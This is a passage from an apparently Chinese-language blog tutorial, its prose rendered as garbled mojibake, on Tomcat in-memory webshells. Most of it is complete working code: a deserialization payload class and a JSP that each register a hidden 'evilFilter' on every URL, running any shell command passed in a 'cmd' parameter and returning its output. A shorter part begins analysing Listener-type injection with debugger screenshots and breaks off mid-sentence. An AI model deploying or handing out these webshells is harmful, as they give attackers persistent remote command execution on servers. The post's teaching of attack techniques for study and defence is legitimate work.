class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŠŠè¯·æ±‚ä¼ å›è¿‡æ»¤é“¾</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¿®æ”¹static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//é™æ€å˜é‡ç›´æ¥å¡«nullå³å¯</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterTemplatesImpl</span><span class="params">(String s)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¼€å§‹æ³¨å…¥å†…å­˜é©¬</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ApplicationContext ä¸º ServletContext çš„å®ç°ç±»</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// è¿™æ ·æˆ‘ä»¬å°±è·å–åˆ°äº† context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTemplatesImpl</span>(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŸç†ä¸ååºåˆ—åŒ–Tomcat-Servletå·®ä¸å¤šï¼Œåªæ˜¯æŠŠæ¶æ„æ¨¡æ¿ç±»æ”¹æˆFilterçš„å®ç°ï¼Œåˆ›å»ºServletçš„æµç¨‹æ”¹æˆåˆ›å»ºFilterçš„æµç¨‹ã€‚å°±ä¸è¿‡å¤šè§£é‡Šäº†ã€‚</p><h4 id="jspæ³¨å…¥Tomcat-Filter-å‹å†…å­˜é©¬"><a href="#jspæ³¨å…¥Tomcat-Filter-å‹å†…å­˜é©¬" class="headerlink" title="jspæ³¨å…¥Tomcat-Filter å‹å†…å­˜é©¬"></a>jspæ³¨å…¥Tomcat-Filter å‹å†…å­˜é©¬</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Listener-å‹å†…å­˜é©¬"><a href="#Tomcat-Listener-å‹å†…å­˜é©¬" class="headerlink" title="Tomcat-Listener å‹å†…å­˜é©¬"></a>Tomcat-Listener å‹å†…å­˜é©¬</h3><h4 id="æµç¨‹åˆ†æ-2"><a href="#æµç¨‹åˆ†æ-2" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h4><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„HelloListenerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request destroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Listeneråˆ†å¤šç§ï¼ŒServletRequestListenerè®¿é—®æœåŠ¡æ—¶è§¦å‘ã€‚åŒæ ·ï¼Œåœ¨ä¸‹å›¾ä½ç½®æ‰“ä¸‹æ–­ç‚¹ï¼Œåˆ†æè°ƒç”¨æ ˆï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f2b1ddac507cc0866e5.jpg" title="image-20230803163546389" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f2b1ddac507cc0866e5.jpg" alt="image-20230803163546389"></a></p><p>è¿›å…¥<code>org.apache.catalina.core.StandardContext#fireRequestInitEvent</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f3b1ddac507cc088ea1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f3b1ddac507cc088ea1.jpg"></a></p><p>å…¶ä¸­listenerçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f461ddac507cc08a99b.jpg" title="image-20230803163747713" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f461ddac507cc08a99b.jpg" alt="image-20230803163747713"></a></p><p>å¯ä»¥çœ‹åˆ°listeneræ˜¯æŠŠinstanceè¿›è¡Œå¼ºè½¬ä¹‹åå¾—åˆ°çš„ã€‚è€Œinstanceæ˜¯instancesæ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬çœ‹çœ‹instancesæ˜¯æ€ä¹ˆæ¥çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f521ddac507cc08c84f.jpg" title="image-20230803163815234" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f521ddac507cc08c84f.jpg" alt="image-20230803163815234"></a></p><p>è·Ÿè¿›<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f5e1ddac507cc08e61c.jpg" title="image-20230803163938618" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f5e1ddac507cc08e61c.jpg" alt="image-20230803163938618"></a></p><p>æˆ‘ä»¬å‘ç°instancesæ˜¯æŠŠ<code>applicationEventListenersList</code>è½¬ä¸ºæ•°ç»„å¾—åˆ°çš„ï¼Œåœ¨<code>org.apache.catalina.core.StandardContext#addApplicationEventListener</code>å‘ç°<code>applicationEventListenersList</code>çš„å…ƒç´ æ˜¯å¦‚ä½•æ·»åŠ çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f681ddac507cc090196.jpg" title="image-20230803164109053" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f681ddac507cc090196.jpg" alt="image-20230803164109053"></a></p><p>å› 